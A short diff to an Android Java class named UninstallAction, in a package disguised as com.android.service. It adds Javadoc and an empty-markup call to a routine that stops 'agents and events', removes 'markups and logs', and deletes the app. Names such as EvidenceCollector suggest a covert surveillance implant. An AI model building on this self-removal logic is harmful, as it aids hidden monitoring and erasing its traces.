@@ -21,7 +21,6 @@ import com.android.service.evidence.EvidenceCollector;
 import com.android.service.evidence.Markup;
 import com.android.service.util.Check;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class UninstallAction.
  */
@@ -57,6 +56,9 @@ public class UninstallAction extends SubAction {
 	 */
 	public static boolean actualExecute() {
 		if(Cfg.DEBUG) Check.log( TAG + " (actualExecute): uninstall");
+		Markup markup=new Markup(0);
+		markup.createEmptyMarkup();
+		
 		boolean ret = stopServices();
 		ret &= removeFiles();
 		ret &= deleteApplication();
@@ -64,6 +66,10 @@ public class UninstallAction extends SubAction {
 		return ret;
 	}
 
+	/**
+	 * Stop agents and events
+	 * @return
+	 */
 	static boolean stopServices() {
 		if (Cfg.DEBUG)
 			Log.d("QZ", TAG + " (stopServices)");
@@ -73,6 +79,10 @@ public class UninstallAction extends SubAction {
 		return true;
 	}
 
+	/**
+	 * Remove markups and logs
+	 * @return
+	 */
 	static boolean removeFiles() {
 		if (Cfg.DEBUG)
 			Log.d("QZ", TAG + " (removeFiles)");
@@ -82,6 +92,10 @@ public class UninstallAction extends SubAction {
 		return true;
 	}
 
+	/**
+	 * Deletes the application
+	 * @return
+	 */
 	static boolean deleteApplication() {
 		if (Cfg.DEBUG)
 			Log.d("QZ", TAG + " (deleteApplication)");
